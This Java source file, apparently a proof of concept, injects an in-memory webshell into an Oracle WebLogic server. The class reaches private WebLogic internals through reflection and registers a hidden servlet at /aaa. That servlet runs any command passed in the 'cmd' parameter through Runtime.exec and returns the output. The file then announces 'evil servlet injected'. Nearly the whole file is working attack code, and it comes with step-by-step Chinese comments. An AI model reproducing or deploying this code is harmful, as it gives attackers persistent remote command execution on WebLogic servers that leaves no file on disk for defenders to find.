package Servlet_regtest;

import weblogic.servlet.internal.ServletStubImpl;
import weblogic.servlet.internal.WebAppServletContext;
import weblogic.servlet.utils.ServletMapping;

import javax.servlet.*;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

@WebServlet("/servlet_reg")
public class Servlet_Servlet_reg implements Servlet {
    public void init(ServletConfig servletConfig) throws ServletException {

    }

    public ServletConfig getServletConfig() {
        return null;
    }

    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {

        // 创建servlet
        HttpServlet httpServlet = new HttpServlet() {
            @Override
            protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
                String cmd = req.getParameter("cmd");
                if (cmd != null) {
                    Process process = Runtime.getRuntime().exec(cmd);
                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream(), "GBK"));
                    String a;
                    PrintWriter out = resp.getWriter();
                    while ((a = bufferedReader.readLine()) != null) {
                        out.write(a);
                    }
                    out.flush();
                    out.close();
                    process.destroy();
                }


                return;
            }
        };

        String URI = "/aaa";
// 获取servletContext
        weblogic.servlet.internal.WebAppServletContext servletContext = (WebAppServletContext) servletRequest.getServletContext();

        try {
            // 获取servletMapping
            Method getServletMapping = servletContext.getClass().getDeclaredMethod("getServletMapping");
            getServletMapping.setAccessible(true);
            ServletMapping mappings = (ServletMapping) getServletMapping.invoke(servletContext);

            // 使用ServletStub包装HttpServlet
            Constructor<?> ServletStubImplConstructor = Class.forName("weblogic.servlet.internal.ServletStubImpl").getDeclaredConstructor(String.class, Servlet.class, WebAppServletContext.class);
            ServletStubImplConstructor.setAccessible(true);
            ServletStubImpl servletStub = (ServletStubImpl) ServletStubImplConstructor.newInstance(URI, httpServlet, servletContext);

            // 使用URLMathchHelper包装ServletStub
            Constructor<?> URLMatchHelperConstructor = Class.forName("weblogic.servlet.internal.URLMatchHelper").getDeclaredConstructor(String.class, ServletStubImpl.class);
            URLMatchHelperConstructor.setAccessible(true);
            Object umh = URLMatchHelperConstructor.newInstance(URI, servletStub);

            // 添加到ServletMapping中，即代表注入servlet内存马成功
            if (mappings.get(URI) == null){
                mappings.put(URI, umh);
            }

        } catch (NoSuchMethodException | InvocationTargetException | IllegalAccessException | ClassNotFoundException | InstantiationException e) {
            e.printStackTrace();
        }

        servletResponse.getWriter().write("evil servlet injected");

    }

    public String getServletInfo() {
        return null;
    }

    public void destroy() {

    }
}
